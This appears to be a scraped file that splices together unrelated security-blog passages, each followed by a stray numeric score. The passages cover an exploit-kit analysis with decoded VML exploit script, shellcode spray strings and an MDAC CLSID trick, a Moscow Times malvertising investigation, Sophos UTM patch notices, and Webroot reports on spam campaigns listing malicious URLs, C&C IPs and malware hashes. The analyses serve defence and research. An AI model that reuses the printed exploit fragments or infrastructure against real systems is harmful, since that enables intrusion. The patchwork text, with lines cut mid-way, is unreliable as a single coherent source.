z_obj.setAttribute(“classid”,a1+a2+a3+a4+a5+a6+a7+a8+a9+a0+b1+b2+b3+b4+””);",0.010908500790448805
"Additional JavaScript contains the variables a1, a2, etc., which decodes to CLSID BD96C556-65A3-11D0-983A-00C04FC29E36. A quick search reveals that this is the infamous MDAC exploit that is still used in kits even after four years of use in the wild, because there are still computers running IE 6 that are vulnerable to the attack.
Other obfuscation tactics may also exist in kits, such as base64. It is common to find strings in source code such as ‘echo base64_decode($h); }’, revealing such functionality. Take, for example, a VML base64-encoded string:
dmFyIGx4MD0iPCI7IHZhciBseDE9InY6ciI7IHZhciBseDI9ImVjdCI7IHZhciBseDM9Ij4iOyB2YXIgbHg0PS
J2OmYiOyB2YXIgbHg1PSJpbGwgIjsgdmFyIGx4Nj0ibWV0IjsNCnZhciBseDc9ImhvIjsgdmFyIGx4OD0iJiN
4IjsgdmFyIGx4OT0iMDYiOyB2YXIgbngwPSIzNTAwIjsgdmFyIG54MT0ieDMwMDAwIjsgdmFyIG54Mj0iMCI7
IHZhciBueDM9MTsNCnZhciB4bHhsMD0iJSI7IHZhciB4bHhsMT0idSI7IHZhciB4bHhsMj0iOTA5MCI7DQp2Y
XIgeGx4bDAwPSIldTQzNDMldTQzNDMldTBmZWIldTMzNWIldTY2YzkldTgwYjkldTgwMD",0.013183639279193304
"<omitted>
A base64 decoding of this data yields the following hostile script that was embedded inside a VML exploit function for Firepack:
var lx0=”<”; var lx1=”v:r”; var lx2=”ect”; var lx3=”>”; var lx4=”v:f”; var lx5=”ill “; var lx6=”met”;
var lx7=”ho”; var lx8=”&#x”; var lx9=”06”; var nx0=”3500”; var nx1=”x30000”; var nx2=”0”; var nx3=1;
var xlxl0=”%”; var xlxl1=”u”; var xlxl2=”9090”;
var xlxl00=”%u4343%u4343%u0feb%u335b%u66c9%u80b9%u80",0.014950247764770497
"<omitted>
Notice that the last variable includes a new obfuscated data set. It may also contain foreign characters. Additionally, various character set conversions may be required for translation by an analyst. While the decoding of such data is not difficult, many layers of obfuscation of different types hinder both automated and manual analysis of such scripts and this tactic does lower detection and mitigation rates.
Encryption is also becoming increasingly common in both exploit frameworks and malicious code, to subvert analysis and identification of hostile traffic. Below is a snippet of code taken from the Firepack kit related to ‘crypt.php’:
function rc4Encrypt($key, $pt) {
$s = array();
for ($i=0; $i<256; $i++) {
$s[$i] = $i;
}",0.013542613182173313
"Anti-sandbox
Development of anti-sandbox analysis capabilities is a growing trend in exploit frameworks. Initially, the most well-known sandboxes were targeted by kit developers, but in 2010 developers have also started to counter lesser-known analysis tools such as JSunPack and Wepawet, as seen in CRiMEPACK. This reveals a more in-depth understanding of the tools and tactics utilized by security experts in the field.",0.012426589216360417
"Security blacklisting notification
Some kits are capable not only of blacklisting by specific IP, but also of monitoring popular online sources such as malwaredomainlist and others and providing notification when exploit sites are blacklisted. CRiMEPACK is one of the more recent kits and one of the most robust in this area, providing automatic notifications to the users of the kit if their exploit sites populate the following sources:
Google Safe Browsing
hpHosts
Norton SafeWeb
Malc0de
Malwaredomainlist
Malwareurl
McAfee SiteAdvisor
My WebOfTrust
This type of counter-intelligence enables actors to know immediately and/or automate when changes to an exploit domain or IP may need to be made, thus maximizing fast flux or Avalanche-campaign-type strategies. While the integration of these two services (blacklisting counter-tactics utilizing fast flux/Avalanche) has not yet been fully realized in kits to date, it seems likely that it is not far away given the affiliations behind such attacks and the mutual interest of criminals to integrate such services. Such developments may significantly impact the prevalence and survivability of exploit frameworks online, greatly benefiting them while outpacing the security industry at large.",0.015199797425280992
"Mitigation
There are plenty of best practices that significantly reduce the likelihood of an attack on an enterprise or consumer computer. Obviously, aggressive patching and auditing of security policies is critical to avoid exploitation by a wide range of possible vulnerabilities. Additionally, a multi-layered defence model using anti-virus, firewall, IDS/IPS and a host of other tools and services helps to protect against drive-by threats. It’s worth nothing that patching isn’t just about Windows any longer but also the third-party applications regularly targeted in drive-by attacks, such as Adobe Reader, Flash, QuickTime and similar add-ons.
Data Execution Prevention (DEP) is one tool that helps even against unknown threats (zero-day exploits). When implemented for all programs it works very well to prevent common vectors of attack. Be cautioned, though, that when used with just Internet Explorer 7 and later, DEP is not fully effective. It has mixed results in dealing with IE-specific exploits. Additionally, DEP for Firefox, Adobe Reader and other tools typically relies on the Windows DEP settings rather than the individual program. As such, the baseline best practice is to enable DEP for all programs and exclude any tools that absolutely must be excluded (keep to a minimum). When properly configured, even computers vulnerable to attack avoid exploitation thanks to DEP blocking the action prior to exploitation.
A single notable exception exists with regard to DEP mitigation: Java. Because it runs in its own sandboxed environment, behaviourally all bets are off for DEP. In lab tests performed using Java exploits from actual kits in the wild, DEP settings did not impact such attacks. Additionally, unconfirmed third-party research on the Internet indicates that Java is not as well updated or managed as other third-party applications, such as Adobe Reader. As such, the overall risk for this vector is increased, which likely drives up exploitation numbers and further encourages criminals to focus on this vector of attack. More seriously, the recent deserialization issue that was implemented in several top kits in late 2009 and early 2010 is considered the ‘Holy Grail’ by some criminals. Not unlike the massive impact of MDAC, the deserialization issue has great potential to be one of the most sought after and most commonly used exploits going forth.
One final note on Java: codes like that of Bankpatch actually look for Java and, if found, upload a patched version of Java to ensure that financial fraud is possible no matter how online sessions are managed. The securing and aggressive auditing of Java must be at the top of all enterprise risk priorities to mitigate such risk.
On the IDS/IPS network layer it is also possible to implement multiple solutions to help mitigate exploit frameworks. For example, top exploit frameworks such as Eleonore, Liberty and others use the shorthand string ‘spl’ for ‘sploit’ in their exploit strings:
Eleonore:
recover7777.com/expl2/pdf.php?spl=pdf_all
Zeus – a top payload in the wild (exploit packs not identified here):
www.qpsk2.ru/ts/load.php?spl=mdac&h=
CRiMEPACK:
la-cosa-nostra.biz/helo/load.php?spl=dshow&b=ie&o=xp&i=WHBMKHp3MI3JbbOqU
ZPack:
mysecret-xxx.com/one/getexe.php?spl=pdf_all
Notice that ‘spl=’ is typically followed by an identification of the exploit, which is helpful both in identification and mitigation. The examples above include PDF exploits, MDAC and DirectShow. In other cases it is common for numbers to be assigned to each exploit vector, such as ‘1’, ‘2’, etc. Behavioural tests and script reviews often reveal the numbers assigned to each exploit within a kit.
While performing additional research for this article queries for ‘spl=’ for hostile domain data revealed a new exploit attack and a possible new kit called ZPack (shown above). While it appears that this may be related to an Eleonore exploit framework, further investigation is underway to better understand the ZPack attribution. This is a prime example of how understanding common URI elements (‘spl=’ query search in this example) in exploit strings is very helpful in identifying unknown exploit sources, strings and related attacks on a network.",0.015969769860697758
"Conclusion
This two-part series has introduced the exploits kits that are contributing to an explosion of such frameworks to facilitate criminal fraud operations. 2010 marks an important period of maturation in the criminal marketplace for exploit frameworks, where basic functionality and rapid adoption of exploits is now the norm. This necessitates advanced features of kits just now emerging including advanced encryption and obfuscation tactics, zero-day exploits customized in kits, the use of loaders to maximize payload distribution and affiliate operations management, and advanced security notifications and counter-tactics utilized by the users of such frameworks.",0.019025866407224146
"Bibliography
[1] http://webcache.googleusercontent.com/search?q=cache:pDIOFFboF7UJ:www.avtracker.info/TU%2520Wien.txt+avtracker.info&cd=1&hl=en&ct=clnk&gl=us&client=firefox-a.
",0.012895583577790637
"Hard times on The Moscow Times
The Moscow Times, ‘Russia’s only daily newspaper in English’, has been a popular source of information for expatriates since it started back in 1992.
In addition to the paper version, there are an official website (themoscowtimes[dot]com), a Facebook page and a Twitter account, all with a significant number of followers.",0.015685313457549643
"A few days ago, several people began reporting a malware alert (Google Safe Browsing) whenever they visited The Moscow Times’ website:",0.016690085652513398
This prompted the paper’s owners to release a statement on Facebook:,0.011986961861507495
"Dear readers, the malware alerts you may be experiencing are due to a coding error in our ad banners. We will fix this asap, but in the meantime please ignore the alerts and proceed to the website. We apologize for the inconvenience!
This was quickly followed by another message advising readers to bypass the ‘fake warnings’:",0.011685948954629488
"Please see our latest post about the malware alerts. In short, they’re fake warnings and you can continue to the page by refreshing the url and removing everything in front of the “http://”. Hope this helps and our apologies.
Unfortunately, it turns out that there was indeed a real malware problem when visiting The Moscow Times’ website:",0.011016017022666746
"But the story doesn’t end here. While there was a claim that the issue had been fixed, someone responded right back to them on Facebook saying it was still going on.
I went data-mining into our honeypot logs and we detected many incidents from October 25 all the way to December 29 (after The Moscow Times had announced the problem was fixed).
What was called a ‘coding error in our banners’ turns out to be malicious ads (malvertising?) redirecting visitors to an exploit kit landing page.
First malicious ad: http://ad.themoscowtimes[dot]com/openx/www/delivery/ag.php",0.010910955169880387
Second malicious ad: http://ad.themoscowtimes[dot]com/openx/www/delivery/ajs.php?zoneid=1&cb=82264722442&charset=windows-1251&loc=http%3A//www.themoscowtimes.com/arts_n_ideas/calendar/cinema.html,0.012040613931912247
Both ads were injected with a malicious iframe: http://fastandfurios.cvfamilymed[dot]com/banners.cgi?advert_id=2&banner_id=2&chid=341aa8fca26bcff7830499c1c5f8e359,0.009031153128395752
A pornographic ad also was injected with a malicious iframe (second malvertising!).,0.008322605948867912
"So, let’s summarize what happened on The Moscow Times’ website for about a week:",0.014578023809669105
"At least two of their ads were compromised
A nasty porn advert was injected in the page (although it would not have been visible to the naked eye because of its size: height: 1px, width: 1px)
A silent redirection (with no user interaction required) launched an exploit kit payload",0.011642045872585216
"Drive-by download infection
Once the malvertising takes place, the infection is pretty straightforward. The following URLs show a pattern belonging to the Neutrino exploit kit and we will quickly analyze it.
http://keico7x.allwebpermit[dot]com:8000/znumwwcfd?irwpgkcogmgg=4389617
http://keico7x.allwebpermit[dot]com:8000/dixtepwiaccvhiled
http://keico7x.allwebpermit[dot]com:8000/tdpjzlvqpmuoge
http://keico7x.allwebpermit[dot]com:8000/arenkyclyryg?fxlkh=dqhqaamdu
http://keico7x.allwebpermit[dot]com:8000/META-INF/services/javax.xml.datatype.DatatypeFactory
http://keico7x.allwebpermit[dot]com:8000/ebkrajrqnooaw?fvntiyrkj=dqhqaamdu
The first URL holds the key to what happens next. It is not a ‘landing page’ in the traditional sense (exploit kit). Its real purpose is to load ($.post(“/dixtepwiaccvhiled”,!1,c)) the real landing page and decode it on the fly with a particular key.",0.01176944067568153
"As you can see, this one is so obfuscated you cannot make sense of it:",0.009325931486041772
"To better understand what it does, I re-arranged the code from the first URL and added an extra ‘alert(o)’ right after the ‘function c’:",0.013021011979376329
This will show you how the content of the landing page is loaded just before getting decoded:,0.008735893757649826
Now all we need to do to find out the decrypted content is put another alert way down near the end:,0.008663214945931474
We can finally see the typical landing page using PluginDetect to do a fingerprint of the user’s computer before unleashing the desired exploits.,0.010963769603359763
"In this case we got a Java exploit, VirusTotal detection here. (If you know which CVE is targeted, please let me know.)
If the Java exploit succeeds, an executable is dropped and executed. The binary is identified as Trojan.Ransom.ED by Malwarebytes Anti-Malware (file analysis here).
Closing thoughts",0.013687673660639388
"Perhaps the people in charge thought this was a mistake on Google’s part. However, there are numerous documented incidents for this website also reported by Google’s Safe Browsing indicating an ongoing problem with malicious advertisements.",0.010564861446819118
"At the time of writing this article, The Moscow Times‘ website was still pushing out malware onto its visitors, as reported by Sucuri’s real-time SiteCheck.",0.014627859226796769
"Given the infected ads’ URL (http://ad.themoscowtimes[dot]com/openx/www/delivery/ag.php) we can deduce that the site is running OpenX, an open-source advertising server software which has had many vulnerabilities in the past.",0.008782949756177438
"Also, back in August, it was found that the OpenX ad server software downloaded from openx.org (the official website) contained a backdoor giving any attacker remote code execution. Reports indicate this Trojanised version had existed for several months before it was finally discovered.",0.008911999808089877
"It is quite possible that the problem lies within the OpenX software running on The Moscow Times’ server, either an outdated version or a backdoored one. What at first seemed like a malvertising issue may very well be a typical website compromise.",0.009448796804953696
"I’ve heard many times before website owners complain that Google was blocking them for no good reason. The reality with web malware is that it can be extremely sneaky and like a bad case of fleas, very hard to get rid of.",0.01218466817311159
"It is unfortunate that poor advice was given on the company’s official Facebook page. The browser warnings are there for a reason and when in doubt it is better to err on the side of caution.
StopBadware has a really good article on “misconceptions about malware warnings” and I could not agree more with their statement:
Please, don’t ignore malware warnings—or encourage others to—because a high-profile case or two claim to have been false positives. It’s up to all of us to help stop badware, and malware warnings play a critical role in protecting the Internet ecosystem.",0.014397116006055755
"—
Jérôme Segura @jeromesegura
",0.011381058843142666
UTM Up2Date 9.113 Released,0.008563187094663638
"Written by
Eric Bégoc",0.010229904213713614
"June 16, 2014",0.008223295957008991
Network up2date UTM UTM 9,0.01007005226623292
"We are pleased to announce that a new Up2Date package is available for Sophos UTM.
This update introduces the bugfix for the OpenSSL SSL/TLS vulnerability (CVE-2014-0224)
Please read on to see the full details of this release.",0.012299643878132205
"Sophos UTM 9.113
News",0.009889550272559555
Security Update,0.007849980180340443
Remarks,0.009780636038266843
"System will be rebooted
Connected RED devices will perform firmware upgrade
Windows SSL VPN Client should be updated",0.007889393400226208
Bugfixes,0.009816324567177737
31939 OpenSSL SSL/TLS MITM vulnerability (CVE-2014-0224) [9.1],0.010888561515866813
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for UTM installations without Internet connections, you can retrieve them using the link below.",0.011992808570035818
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.112012-113001.tgz.gpg",0.010083484581400626
"Up2date MD5sum:
ca92863b248868df05405b0ec065660c",0.009624017585641464
"File size:
≈12MB",0.007895630990491731
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
UTM Up2Date 9.203 Released,0.008514601493668894
"Written by
Eric Bégoc",0.010229904213713614
"June 18, 2014",0.008192054122057146
Network up2date UTM UTM 9,0.01007005226623292
"We are pleased to announce that a new Up2Date package is available for Sophos UTM.
This update introduces several bug fixes and also includes the fix for the OpenSSL SSL/TLS vulnerability (CVE-2014-0224)
Please read on to see the full details of this release.",0.011304481087601514
"Sophos UTM 9.203
News",0.009046126738169735
Security Update,0.007849980180340443
Remarks,0.009780636038266843
"System will be rebooted
Configuration will be upgraded
Connected Wifi APs will perform firmware upgrade
Connected RED devices will perform firmware upgrade
Windows SSL VPN Client should be updated",0.00927209091507264
Bugfixes,0.009816324567177737
"31027 FTP proxy active mode did not work and failed with the antivirus turned on
31460 Exception is detected but will be ignored on outgoing emails (when scan outgoing messages is active)
31571 Executive reports failed with error message “Bad file descriptor”
31594 Display of a SG Series shows ‘HA Slave Status Error’
31716 Permanent admin-reporter.pl restarts causing high cpu load
31938 OpenSSL SSL/TLS MITM vulnerability (CVE-2014-0224)",0.009986407918688545
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for UTM installations without Internet connections, you can retrieve them using the link below.",0.011992808570035818
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.202028-203003.tgz.gpg",0.010114968434797866
"Up2date MD5sum:
003dd2c89a9281f2b34d7c92892fc563",0.010059996659364856
"File size:
≈60MB",0.008196773175271788
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Everyone uses Amazon! At least that’s what the cybercriminals are hoping.  Cybercriminals are currently spamvertising millions of emails impersonating Amazon.com Inc. in an attempt to trick end and corporate users into clicking on the malicious links found in the emails.
More details:",0.0205939401543348
Screenshot of the spamvertised email:,0.01024206182675269
"Sample subjects: Your Amazon.com Kindle e-book order confirmation; Your Amazon.com order confirmation
Sample spamvertised compromised URls: hxxp://www.archos5.com/wp-content/themes/twentyten/enoz.html; hxxp://bambizilla.com/wp-includes/enoz.html; hxxp://save20discout.com/wp-content/plugins/social-stats/omaz.html
Client-side exploits serving URls: hxxp://kidwingz.net/main.php?page=614411383eef8d97; hxxp://cool-mail.net/main.php?page=640db37c90c88306
cool-mail.net responds to 84.106.114.97, responding to the same IP are also the following domains lifelovework.net; homeofficecaptioning.ru. Name servers courtesy of  ns1.grapecomputers.net with the following domains also using the same name server as cool-mail.net – grapecomputers.net; kidwingz.net; itscholarshipz.net;  homeofficecaptioning.ru; kidwingz.net responds to 208.91.197.54.
Both domains attempt to exploit client-side exploits served by the BlackHole web malware exploitation kit, Exploits CVE-2010-1885 in particular.
Upon successful client-side exploitation the campaingn drops MD5: c23dab8cff55155f815639d7072de21a detected by 31 out of 42 antivirus scanners as TROJ_CRYPTOR.TH; Trojan.Generic.KD.644812, and and MD5: 49f91a1597bc4dd25d3d23302125dae7 – detected by 5 out of 41 antivirus scanners as PWS-Zbot.gen.xs
Upon execution the samples create the following registry entry, next to creating a new process:
[HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionRun] KB00121600.exe = “”%AppData%KB00121600.exe” so that KB00121600.exe runs every time Windows starts
Next, the samples phones back to 85.214.204.32 on port 8080, hxxp://85.214.204.32:8080/zb/v_01_b/in/ in particular.
More MD5s are known to have phone back to the same command and control C&C server in the past:
MD5: aa9b1b6037afaceee96c888c948a20fe – detected by 14 out of 42 antivirus scanners as Trojan.Generic.KDV.647512
MD5: 49f91a1597bc4dd25d3d23302125dae7 – detected by 5 out of 41 antivirus scanners as PWS-Zbot.gen.xs
MD5: 734aadd62d0662256a65510271d40048 – detected by 9 out of 42 antivirus scanners as Troj/DwnLdr-KAY
MD5: a444a9a941c1f0d28e5c3de711f04a3c – detected by 14 out of 42 antivirus scanners as Trojan.Generic.KD.647627
MD5: 3c87e446ccee826a4707d47f268d705d – detected by 25 out of 42 antivirus scanners as W32/AutoRun_Spy_Banker.P
MD5: cf6f40f1ce37fd8edefc447f68a88e1f – detected by 32 out of 42 antivirus scanners as Trojan.Win32.Yakes.aemo
MD5: 179c9ac5c2540a9bca5c0908e589a768 – detected by 28 out of 42 antivirus scanners as Troj/Bckdr-RLT
MD5: 83db494b36bd38646e54210f6fdcbc0d – detected by 33 out of 42 antivirus scanners as PWS-Zbot.gen.aae
MD5: 462210ddded90ea065829766797b42b7 – detected by 32 out of 42 antivirus scanners as Trojan-Dropper.Win32.Dapato.adpv
MD5: 712be7239b0e7e47869798658dabd4d0 – detected by 30 out of 42 antivirus scanners as Trojan-Ransom.Win32.PornoAsset.emi
It’s worth emphasizing on the command and control (C&C) IP – 85.214.204.32. Responding to 85.214.204.32 are the following name servers:
ns3.pistolitnameste.ru
ns3.puleneprobivaemye.ru
ns2.spbfotomontag.ru
ns3.pushkidamki.ru
ns3.hamlovladivostok.ru
ns3.saprolaunimaxim.ru
ns2.uzindexation.ru
ns2.holigaansongeer.ru
ns3.paranoiknepjet.ru
ns2.piloramamoskow.ru
ns2.girlsnotcryz.ru
Historically, the following domains were also responding to the same IP, part of the botnet’s infrastructure:
cvredret.ru
cxredret.ru
opiumdlanaroda.ru
porosenokpetya.ru
garemonmystage.ru
horoshovsebudet.ru
hmvmgywkvayilcwh.ru
wfyusepaxvulfdtn.ru
wiwwkvjkinewgycb.ru
hjpyvexsutdctjol.ru
hbirjhcnsuiwgtrq.ru
axwiyyfbraskytvs.ru
skjwysujlpedxxsl.ru
sumgankorobanns.ru
ngdvmtwodjjuovsnfj.ru
vjcuiqecxaomkytb.ru
vaopxjiaphevkfpqdo.ru
yhbyqwmrtqxvmpryon.ru
qtdlnxbqfohcpwft.ru
jfhxihwykiuwfknoni.ru
kblqegxrumlsrefvmb.ru
hngajjkuknzwdliqfj.ru
hdylanfzmfngwbwxnc.ru
gizosuxwpeujnykjye.ru
jlkjsxdsvtkygouiix.ru
nolwzyzsqkhjkqhomc.ru
wbgguucrbkrkjftn.ru
usepaxvulfdtnwiwwk.ru
eoicszuwkjskhvki.ru
mceglkuyhzvzjxbj.ru
Historical OSINT on the name servers involved in the campaign, and the botnet’s infrastructure in general:
ns1.girlsnotcryz.ru => 62.213.64.161
ns2.girlsnotcryz.ru => 85.214.204.32
ns3.girlsnotcryz.ru => 50.57.88.200
ns4.girlsnotcryz.ru => 184.106.189.124
ns5.girlsnotcryz.ru => 50.57.43.49
ns1.hamlovladivostok.ru => 62.213.64.161
ns2.hamlovladivostok.ru => 62.76.189.62
ns3.hamlovladivostok.ru => 85.214.204.32
ns4.hamlovladivostok.ru => 50.57.88.200
ns5.hamlovladivostok.ru => 41.66.137.155
ns6.hamlovladivostok.ru => 50.57.43.49
ns1.puleneprobivaemye.ru => 62.213.64.161
ns2.puleneprobivaemye.ru => 62.76.189.62
ns3.puleneprobivaemye.ru => 85.214.204.32
ns4.puleneprobivaemye.ru => 50.57.88.200
ns5.puleneprobivaemye.ru => 41.66.137.155
ns6.puleneprobivaemye.ru => 50.57.43.49
ns1.pushkidamki.ru => 62.213.64.161
ns2.pushkidamki.ru => 62.76.189.62
ns3.pushkidamki.ru => 85.214.204.32
ns4.pushkidamki.ru => 50.57.88.200
ns5.pushkidamki.ru => 41.66.137.155
ns6.pushkidamki.ru => 50.57.43.49
ns1.spbfotomontag.ru => 62.213.64.161
ns2.spbfotomontag.ru => 85.214.204.32
ns3.spbfotomontag.ru => 50.57.88.200
ns4.spbfotomontag.ru => 184.106.189.124
ns5.spbfotomontag.ru => 50.57.43.49
ns1.piloramamoskow.ru => 62.213.64.161
ns2.piloramamoskow.ru => 85.214.204.32
ns3.piloramamoskow.ru => 50.57.88.200
ns4.piloramamoskow.ru => 184.106.189.124
ns5.piloramamoskow.ru => 50.57.43.49
ns1.insomniacporeed.ru => 62.213.64.161
ns2.insomniacporeed.ru => 85.214.204.32
ns3.insomniacporeed.ru => 50.57.88.200
ns4.insomniacporeed.ru => 184.106.189.124
ns5.insomniacporeed.ru => 50.57.43.49
ns1.norilsknikeli.ru => 62.213.64.161
ns2.norilsknikeli.ru => 85.214.204.32
ns3.norilsknikeli.ru => 50.57.88.200
ns4.norilsknikeli.ru => 184.106.189.124
ns5.norilsknikeli.ru => 50.57.43.49
ns1.mazdaforumi.ru => 62.213.64.161
ns2.mazdaforumi.ru => 85.214.204.32
ns3.mazdaforumi.ru => 50.57.88.200
ns4.mazdaforumi.ru => 184.106.189.124
ns5.mazdaforumi.ru => 50.57.43.49
ns1.immerialtv.ru => 62.76.41.3
ns2.immerialtv.ru => 62.213.64.161
ns3.immerialtv.ru => 195.88.242.10
ns4.immerialtv.ru => 41.66.137.155
ns5.immerialtv.ru => 83.170.91.152
ns6.immerialtv.ru => 85.214.204.32
ns1.opimmerialtv.ru => 62.213.64.161
ns2.opimmerialtv.ru => 85.214.204.32
ns3.opimmerialtv.ru => 50.57.88.200
ns4.opimmerialtv.ru => 184.106.189.124
ns5.opimmerialtv.ru => 50.57.43.49
ns1.pokeronmep.ru => 62.76.41.3
ns2.pokeronmep.ru => 62.213.64.161
ns3.pokeronmep.ru => 195.88.242.10
ns4.pokeronmep.ru => 41.66.137.155
ns5.pokeronmep.ru => 83.170.91.152
ns6.pokeronmep.ru => 85.214.204.32
ns1.poluicenotgo.ru => 62.76.41.3
ns2.poluicenotgo.ru => 62.213.64.161
ns3.poluicenotgo.ru => 195.88.242.10
ns4.poluicenotgo.ru => 41.66.137.155
ns5.poluicenotgo.ru => 83.170.91.152
ns6.poluicenotgo.ru => 85.214.204.32
ns1.uiwewsecondary.ru => 62.76.41.3
ns2.uiwewsecondary.ru => 62.213.64.161
ns3.uiwewsecondary.ru => 195.88.242.10
ns4.uiwewsecondary.ru => 41.66.137.155
ns5.uiwewsecondary.ru => 83.170.91.152
ns6.uiwewsecondary.ru => 85.214.204.32
ns1.validatoronmee.ru => 62.213.64.161
ns2.validatoronmee.ru => 195.62.52.69
ns3.validatoronmee.ru => 62.76.191.172
ns4.validatoronmee.ru => 41.66.137.155
ns5.validatoronmee.ru => 83.170.91.152
ns6.validatoronmee.ru => 85.214.204.32
ns1.vitalitysomer.ru => 62.213.64.161
ns2.vitalitysomer.ru => 195.62.52.69
ns3.vitalitysomer.ru => 62.76.191.172
ns4.vitalitysomer.ru => 41.66.137.155
ns5.vitalitysomer.ru => 83.170.91.152
ns6.vitalitysomer.ru => 85.214.204.32
ns1.wiskonsintpara.ru => 62.76.41.3
ns2.wiskonsintpara.ru => 62.213.64.161
ns3.wiskonsintpara.ru => 195.62.52.69
ns4.wiskonsintpara.ru => 41.66.137.155
ns5.wiskonsintpara.ru => 83.170.91.152
ns6.wiskonsintpara.ru => 85.214.204.32
ns1.webmastaumuren.ru => 62.76.41.3
ns2.webmastaumuren.ru => 62.213.64.161
ns3.webmastaumuren.ru => 195.62.52.69
ns4.webmastaumuren.ru => 41.66.137.155
ns5.webmastaumuren.ru => 83.170.91.152
ns6.webmastaumuren.ru => 85.214.204.32
ns1.webmastersuon.ru => 62.76.41.3
ns2.webmastersuon.ru => 62.213.64.161
ns3.webmastersuon.ru => 195.62.52.69
ns4.webmastersuon.ru => 41.66.137.155
ns5.webmastersuon.ru => 83.170.91.152
ns6.webmastersuon.ru => 85.214.204.32
ns1.qvzhpiaswhqlswkjit.ru => 62.76.45.241
ns2.qvzhpiaswhqlswkjit.ru => 62.213.64.161
ns3.qvzhpiaswhqlswkjit.ru => 85.214.204.32
ns4.qvzhpiaswhqlswkjit.ru => 216.151.129.198
ns1.xspisokdomenidgmens.ru => 62.76.45.241
ns2.xspisokdomenidgmens.ru => 62.76.191.172
ns3.xspisokdomenidgmens.ru => 62.213.64.161
ns4.xspisokdomenidgmens.ru => 85.214.204.32
ns5.xspisokdomenidgmens.ru => 209.114.47.158
ns6.xspisokdomenidgmens.ru => 78.83.233.242
Go through related analysis on previously spamvertised malware-serving campaigns:",0.010728500137210384
"Spamvertised ‘DHL Package delivery report’ emails serving malware
Spamvertised ‘UPS Delivery Notification’ emails serving client-side exploits and malware
Spamvertised bogus online casino themed emails serving adware
Spamvertised ‘Scan from a Hewlett-Packard ScanJet’ emails lead to client-side exploits and malware
Spamvertised CareerBuilder themed emails serving client-side exploits and malware
Spamvertised Verizon-themed ‘Your Bill Is Now Available’ emails lead to ZeuS crimeware
Spamvertised ‘US Airways’ themed emails serving client-side exploits and malware
Spamvertised LinkedIn notifications serving client-side exploits and malware
Spamvertised ‘Pizzeria Order Details’ themed campaign serving client-side exploits and malware
Spamvertised ‘Your tax return appeal is declined’ emails serving client-side exploits and malware
Spamvertised ‘Your accountant license can be revoked’ emails lead to client-side exploits and malware
Spamvertised ‘Termination of your CPA license’ campaign serving client-side exploits",0.020340973247174432
"Webroot SecureAnywhere users are proactively protected from this threat.
Meanwhile, users are advised to ensure that they are not running outdated versions of their third-party software and browser plugins in an attempt to mitigate the risks posed by web malware exploitation kits exploiting outdated and already patched vulnerabilities.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.009735683434017761
"Over the past 24 hours, cybercriminals started spamvertising millions of emails impersonating the Federal Deposit Insurance Corporation (FDIC), in an attempt to trick businesses into installing a bogus and non-existent security tool promoted in the emails. Upon clicking on the links, users are exposed to the client-side exploits served by the Black Hole Exploit Kit.
More details:",0.01373294990407059
Sample screenshot of the spamvertised FDIC impersonating email:,0.009130590883192902
"Once the user clicks on the malicious link, he’s exposed to the following bogus “Page loading…” page:",0.011211808688986746
Screenshot of a sample Java script obfuscation:,0.009631862016331483
"Spamvertised malicious and compromised URLs: hxxp://jiuzehui.com/achsec.html; hxxp://www.incikolye.org/achsec.html; hxxp://luciledufresne.fr/secupd.html
Client-side exploits serving URL: hxxp://afgreenwich.net/main.php?page=0f123fe645ddf8d7 – 203.91.113.6 (AS24559)
We’ve already seen the same IP used in the recently profiled “Spamvertised ‘US Airways reservation confirmation’ themed emails serve exploits and malware” campaign. Clearly, the FDIC campaign is using the same malicious infrastructure as the US Airways themed campaign.
Client-side exploits served: CVE-2010-1885
Detection rate for a sample Java script redirector: MD5: b72226f67ec59f3c7a7f2b970f04272f – detected by 8 out of 42 antivirus scanners as JS:Trojan.Crypt.HM
Upon successful client-side exploitation, the campaign drops MD5: 3ce1ae2605aa800c205ef63a45ffdbfa – detected by 16 out of 42 antivirus scanners as Trojan-Ransom.Win32.Gimemo.aovu; W32.Cridex
Once executed, it attempts to phone back to 72.167.253.106:8080/mx/5/B/in (AS26496).
